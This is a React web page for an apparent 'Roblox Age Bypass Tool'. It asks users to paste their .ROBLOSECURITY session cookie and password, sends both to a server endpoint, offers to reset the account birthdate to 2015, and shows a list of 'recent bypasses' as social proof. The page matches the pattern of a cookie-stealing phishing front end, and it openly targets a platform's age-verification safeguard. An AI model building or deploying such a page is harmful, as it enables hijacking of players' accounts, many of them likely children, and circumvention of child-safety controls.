'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Loader2, Check, AlertCircle } from 'lucide-react'

export default function Home() {
  const [cookie, setCookie] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [success, setSuccess] = useState(false)
  const [error, setError] = useState('')
  const [userInfo, setUserInfo] = useState<any>(null)
  const [avatarUrl, setAvatarUrl] = useState('')
  const [birthdate, setBirthdate] = useState('')
  const [birthdateLoading, setBirthdateLoading] = useState(false)
  const [birthdateSuccess, setBirthdateSuccess] = useState(false)
  const [birthdateError, setBirthdateError] = useState('')
  const [recentBypasses, setRecentBypasses] = useState<any[]>([])

  useEffect(() => {
    const fetchRecentBypasses = async () => {
      try {
        const response = await fetch('/api/recent-bypasses')
        if (response.ok) {
          const data = await response.json()
          setRecentBypasses(data.bypasses || [])
        }
      } catch (err) {
        console.error('Failed to fetch recent bypasses:', err)
      }
    }
    fetchRecentBypasses()
  }, [])

  const handleBypass = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')
    setSuccess(false)
    setUserInfo(null)

    try {
      const response = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, password }),
      })

      const data = await response.json()

      if (data.success) {
        setSuccess(true)
        setUserInfo(data.userInfo)
        setAvatarUrl(data.avatarUrl)
        setCookie('')
        setPassword('')
      } else {
        setError(data.error || 'Bypass failed')
      }
    } catch (err) {
      setError('Error during bypass: ' + (err instanceof Error ? err.message : 'Unknown error'))
    } finally {
      setLoading(false)
    }
  }

  const handleSetBirthdate = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!userInfo) {
      setBirthdateError('Please complete a bypass first')
      return
    }

    setBirthdateLoading(true)
    setBirthdateError('')
    setBirthdateSuccess(false)

    try {
      const response = await fetch('/api/set-birthdate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: userInfo.id,
          birthdate: birthdate || '2015-01-01',
        }),
      })

      const data = await response.json()

      if (data.success) {
        setBirthdateSuccess(true)
        setBirthdate('')
      } else {
        setBirthdateError(data.error || 'Failed to set birthdate')
      }
    } catch (err) {
      setBirthdateError('Error: ' + (err instanceof Error ? err.message : 'Unknown error'))
    } finally {
      setBirthdateLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">Roblox Age Bypass Tool</h1>
          <p className="text-slate-300">Bypass age verification and change your account birthdate</p>
        </div>

        {/* Main Bypass Card */}
        <Card className="bg-slate-800 border-slate-700">
          <CardHeader>
            <CardTitle className="text-white">Account Bypass</CardTitle>
            <CardDescription className="text-slate-400">Enter your Roblox cookie and password to bypass age verification</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleBypass} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-slate-200 mb-2">
                  Roblox Cookie
                </label>
                <Input
                  type="password"
                  placeholder="Paste your .ROBLOSECURITY cookie"
                  value={cookie}
                  onChange={(e) => setCookie(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  disabled={loading}
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-200 mb-2">
                  Password
                </label>
                <Input
                  type="password"
                  placeholder="Your Roblox password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                  disabled={loading}
                />
              </div>

              {error && (
                <Alert className="bg-red-900 border-red-700">
                  <AlertCircle className="h-4 w-4 text-red-200" />
                  <AlertDescription className="text-red-200">{error}</AlertDescription>
                </Alert>
              )}

              {success && userInfo && (
                <Alert className="bg-green-900 border-green-700">
                  <Check className="h-4 w-4 text-green-200" />
                  <AlertDescription className="text-green-200">
                    Successfully bypassed! User: {userInfo.name}
                  </AlertDescription>
                </Alert>
              )}

              <Button
                type="submit"
                disabled={loading || !cookie || !password}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white"
              >
                {loading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Processing...
                  </>
                ) : (
                  'Execute Bypass'
                )}
              </Button>
            </form>
          </CardContent>
        </Card>

        {/* Birthdate Changer Card */}
        {userInfo && (
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader>
              <CardTitle className="text-white">Birthdate Changer</CardTitle>
              <CardDescription className="text-slate-400">
                Change your account birthdate to {new Date(2015, 0, 1).toLocaleDateString()}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSetBirthdate} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-200 mb-2">
                    Target Birthdate
                  </label>
                  <Input
                    type="date"
                    value={birthdate}
                    onChange={(e) => setBirthdate(e.target.value)}
                    className="bg-slate-700 border-slate-600 text-white"
                    disabled={birthdateLoading}
                  />
                  <p className="text-xs text-slate-400 mt-1">
                    Leave empty to set to 2015-01-01
                  </p>
                </div>

                {birthdateError && (
                  <Alert className="bg-red-900 border-red-700">
                    <AlertCircle className="h-4 w-4 text-red-200" />
                    <AlertDescription className="text-red-200">{birthdateError}</AlertDescription>
                  </Alert>
                )}

                {birthdateSuccess && (
                  <Alert className="bg-green-900 border-green-700">
                    <Check className="h-4 w-4 text-green-200" />
                    <AlertDescription className="text-green-200">
                      Birthdate successfully changed!
                    </AlertDescription>
                  </Alert>
                )}

                <Button
                  type="submit"
                  disabled={birthdateLoading}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white"
                >
                  {birthdateLoading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Changing...
                    </>
                  ) : (
                    'Change Birthdate to 2015'
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        )}

        {/* Recent Bypasses Card */}
        {recentBypasses.length > 0 && (
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader>
              <CardTitle className="text-white">Recent Bypasses</CardTitle>
              <CardDescription className="text-slate-400">
                Recently processed accounts
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {recentBypasses.map((bypass, index) => (
                  <div key={index} className="flex items-center justify-between p-2 bg-slate-700 rounded">
                    <div>
                      <p className="text-sm font-medium text-white">{bypass.username}</p>
                      <p className="text-xs text-slate-400">{bypass.timestamp}</p>
                    </div>
                    <span className="text-xs bg-green-600 text-white px-2 py-1 rounded">
                      Success
                    </span>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
